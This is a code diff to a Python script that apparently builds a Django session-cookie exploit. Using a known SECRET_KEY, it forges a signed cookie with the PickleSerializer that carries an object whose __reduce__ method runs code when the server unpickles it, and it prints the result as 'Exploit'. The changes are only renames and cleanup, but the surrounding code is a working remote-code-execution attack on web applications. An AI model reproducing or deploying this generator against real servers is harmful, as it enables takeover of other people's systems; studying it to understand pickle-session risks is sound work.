@@ -7,7 +7,7 @@ from django.contrib.sessions import serializers
 from settings import banner
 
 # Clean the terminal, cmd and print the banner
-os.system("cls") if os.name == "nt" else os.system("clear")
+os.system("cls" if os.name == 'nt' else "clear")
 print(banner())
 
 
@@ -16,7 +16,7 @@ def __reduce__(self):
 
 
 # Define a class using objects (In Python, everything is an object) :)
-poc = type(
+Poc = type(
     "POC",
     (object,),
     {"__reduce__": __reduce__}
@@ -27,17 +27,17 @@ SECRET_KEY, COOKIE = os.environ.get("SECRET_KEY"), os.environ.get("COOKIE")
 
 # Check if secret key match the cookie
 try:
-    newContent = loads(COOKIE, key=SECRET_KEY, serializer=serializers.PickleSerializer,
+    new_content = loads(COOKIE, key=SECRET_KEY, serializer=serializers.PickleSerializer,
                        salt='django.contrib.sessions.backends.signed_cookies')
 except BadSignature:
     print("SECRET_KEY does not match the sample cookie")
     sys.exit()
 
 # Instance of generated poc
-newContent['testcookie'] = poc()
+new_content['testcookie'] = Poc()
 
 # Generate the exploit
-exploit = dumps(newContent, key=SECRET_KEY, serializer=serializers.PickleSerializer,
+exploit = dumps(new_content, key=SECRET_KEY, serializer=serializers.PickleSerializer,
                 salt='django.contrib.sessions.backends.signed_cookies', compress=True)
 
 print(f"Exploit -> {exploit}")
